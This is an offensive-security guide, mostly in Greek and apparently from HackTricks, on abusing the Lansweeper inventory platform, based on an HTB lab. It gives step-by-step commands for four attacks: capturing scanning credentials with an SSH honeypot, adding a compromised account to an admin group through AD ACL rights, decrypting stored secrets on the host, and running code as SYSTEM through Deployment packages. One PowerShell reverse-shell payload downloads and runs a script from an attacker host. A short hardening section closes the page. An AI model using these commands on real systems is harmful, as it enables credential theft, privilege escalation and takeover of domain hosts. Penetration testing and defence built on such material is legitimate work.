# Lansweeper Abuse: Credential Harvesting, Secrets Decryption, and Deployment RCE

{{#include ../../banners/hacktricks-training.md}}

Lansweeper είναι μια πλατφόρμα ανακάλυψης και inventory IT που συνήθως αναπτύσσεται σε Windows και ενσωματώνεται με Active Directory. Οι credentials που έχουν ρυθμιστεί στο Lansweeper χρησιμοποιούνται από τις scanning engines για authentication σε assets μέσω πρωτοκόλλων όπως SSH, SMB/WMI και WinRM. Λανθασμένες ρυθμίσεις συχνά επιτρέπουν:

- Κατάσχεση credentials με επαναπροσανατολισμό ενός scanning target σε attacker-controlled host (honeypot)
- Κατάχρηση των AD ACLs που εκτίθενται από Lansweeper-related groups για να αποκτηθεί remote access
- Αποκρυπτογράφηση στο host των secrets που έχουν ρυθμιστεί στο Lansweeper (connection strings και αποθηκευμένα scanning credentials)
- Εκτέλεση κώδικα σε managed endpoints μέσω του Deployment feature (συχνά εκτελείται ως SYSTEM)

Αυτή η σελίδα συνοψίζει πρακτικά workflows και εντολές που μπορεί να χρησιμοποιήσει ένας attacker για να εκμεταλλευτεί αυτές τις συμπεριφορές κατά τη διάρκεια engagements.

## 1) Harvest scanning credentials via honeypot (SSH example)

Ιδέα: δημιουργήστε ένα Scanning Target που δείχνει στο host σας και αντιστοιχίστε υπάρχοντα Scanning Credentials σε αυτό. Όταν τρέξει το scan, το Lansweeper θα προσπαθήσει να authenticate με αυτά τα credentials και το honeypot σας θα τα καταγράψει.

Steps overview (web UI):
- Scanning → Scanning Targets → Add Scanning Target
- Type: IP Range (or Single IP) = your VPN IP
- Configure SSH port to something reachable (e.g., 2022 if 22 is blocked)
- Disable schedule and plan to trigger manually
- Scanning → Scanning Credentials → ensure Linux/SSH creds exist; map them to the new target (enable all as needed)
- Click “Scan now” on the target
- Run an SSH honeypot and retrieve the attempted username/password

Example with sshesame:
```yaml
# sshesame.conf
server:
listen_address: 10.10.14.79:2022
```

```bash
# Install and run
sudo apt install -y sshesame
sshesame --config sshesame.conf
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
Επαλήθευση των καταγεγραμμένων creds έναντι των υπηρεσιών DC:
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Σημειώσεις
- Λειτουργεί ανάλογα και για άλλα πρωτόκολλα όταν μπορείτε να εξαναγκάσετε τον scanner στον listener σας (SMB/WinRM honeypots, κ.λπ.). Το SSH είναι συχνά το πιο απλό.
- Πολλοί scanners αναγνωρίζουν τον εαυτό τους με ξεχωριστά client banners (π.χ. RebexSSH) και θα επιχειρήσουν αβλαβείς εντολές (uname, whoami, κ.λπ.).

## 2) AD ACL abuse: gain remote access by adding yourself to an app-admin group

Χρησιμοποιήστε BloodHound για να εντοπίσετε τα effective rights από τον συμβιβασμένο λογαριασμό. Ένα συνηθισμένο εύρημα είναι μια scanner- ή app-specific group (π.χ. “Lansweeper Discovery”) που κατέχει GenericAll επάνω σε μια ομάδα με προνόμια (π.χ. “Lansweeper Admins”). Αν η ομάδα με προνόμια είναι επίσης μέλος των “Remote Management Users”, το WinRM γίνεται διαθέσιμο μόλις προσθέσουμε τον εαυτό μας.

Collection examples:
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
Εκμετάλλευση του GenericAll σε group με BloodyAD (Linux):
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Στη συνέχεια πάρε ένα interactive shell:
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Συμβουλή: Οι λειτουργίες Kerberos είναι ευαίσθητες στον χρόνο. Αν αντιμετωπίσετε KRB_AP_ERR_SKEW, συγχρονιστείτε με τον DC πρώτα:
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) Αποκρυπτογραφήστε τα Lansweeper-configured secrets στον host

Στον Lansweeper server, ο ιστότοπος ASP.NET συνήθως αποθηκεύει ένα κρυπτογραφημένο connection string και ένα συμμετρικό κλειδί που χρησιμοποιείται από την εφαρμογή. Με κατάλληλη τοπική πρόσβαση, μπορείτε να αποκρυπτογραφήσετε το DB connection string και στη συνέχεια να εξάγετε τα αποθηκευμένα scanning credentials.

Τυπικές τοποθεσίες:
- Web config: `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Application key: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

Χρησιμοποιήστε SharpLansweeperDecrypt για να αυτοματοποιήσετε την αποκρυπτογράφηση και την εξαγωγή των αποθηκευμένων creds:
```powershell
# From a WinRM session or interactive shell on the Lansweeper host
# PowerShell variant
Upload-File .\LansweeperDecrypt.ps1 C:\ProgramData\LansweeperDecrypt.ps1   # depending on your shell
powershell -ExecutionPolicy Bypass -File C:\ProgramData\LansweeperDecrypt.ps1
# Tool will:
#  - Decrypt connectionStrings from web.config
#  - Connect to Lansweeper DB
#  - Decrypt stored scanning credentials and print them in cleartext
```
Το αναμενόμενο αποτέλεσμα περιλαμβάνει DB connection details και plaintext scanning credentials όπως Windows και Linux accounts που χρησιμοποιούνται σε ολόκληρο το estate. Αυτά συχνά έχουν αυξημένα τοπικά δικαιώματα σε domain hosts:
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
Χρησιμοποιήστε ανακτημένα Windows scanning creds για προνομιούχα πρόσβαση:
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Lansweeper Deployment → SYSTEM RCE

Ως μέλος των “Lansweeper Admins”, το web UI εμφανίζει τα Deployment και Configuration. Στο Deployment → Deployment packages, μπορείτε να δημιουργήσετε πακέτα που εκτελούν αυθαίρετες εντολές σε στοχευμένα assets. Η εκτέλεση πραγματοποιείται από την υπηρεσία Lansweeper με υψηλά δικαιώματα, παρέχοντας εκτέλεση κώδικα ως NT AUTHORITY\SYSTEM στον επιλεγμένο host.

High-level steps:
- Δημιουργήστε ένα νέο Deployment package που εκτελεί ένα PowerShell ή cmd one-liner (reverse shell, add-user, κ.λπ.).
- Στοχεύστε το επιθυμητό asset (π.χ. τον DC/host όπου τρέχει το Lansweeper) και κάντε κλικ στο Deploy/Run now.
- Πιάστε το shell σας ως SYSTEM.

Example payloads (PowerShell):
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- Οι ενέργειες ανάπτυξης είναι θορυβώδεις και αφήνουν καταγραφές στο Lansweeper και στα Windows event logs. Χρησιμοποιήστε με φειδώ.

## Ανίχνευση και σκληροποίηση

- Περιορίστε ή αφαιρέστε τις ανώνυμες SMB enumerations. Παρακολουθήστε για RID cycling και ασυνήθιστες προσβάσεις σε Lansweeper shares.
- Έλεγχοι εξόδου: μπλοκάρετε ή περιορίστε αυστηρά την εξερχόμενη κίνηση SSH/SMB/WinRM από scanner hosts. Δημιουργήστε ειδοποίηση για μη-τυπικές θύρες (π.χ., 2022) και ασυνήθιστα client banners όπως Rebex.
- Προστατέψτε `Website\\web.config` και `Key\\Encryption.txt`. Εξωτερικοποιήστε τα secrets σε vault και ανανεώστε (rotate) σε περίπτωση έκθεσης. Εξετάστε service accounts με ελάχιστα προνόμια και gMSA όπου είναι εφαρμόσιμο.
- Παρακολούθηση AD: ειδοποιήστε για αλλαγές σε Lansweeper-related groups (π.χ., “Lansweeper Admins”, “Remote Management Users”) και για αλλαγές ACL που παρέχουν GenericAll/Write σε προνομιούχες ομάδες.
- Καταγράψτε/επιτηρήστε τις δημιουργίες/αλλαγές/εκτελέσεις Deployment package· ειδοποιήστε για πακέτα που spawnάρουν cmd.exe/powershell.exe ή για μη αναμενόμενες εξερχόμενες συνδέσεις.

## Σχετικά θέματα
- SMB/LSA/SAMR enumeration and RID cycling
- Kerberos password spraying and clock skew considerations
- BloodHound path analysis of application-admin groups
- WinRM usage and lateral movement

## Αναφορές
- [HTB: Sweep — Abusing Lansweeper Scanning, AD ACLs, and Secrets to Own a DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
- [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [BloodHound CE](https://github.com/SpecterOps/BloodHound)

{{#include ../../banners/hacktricks-training.md}}
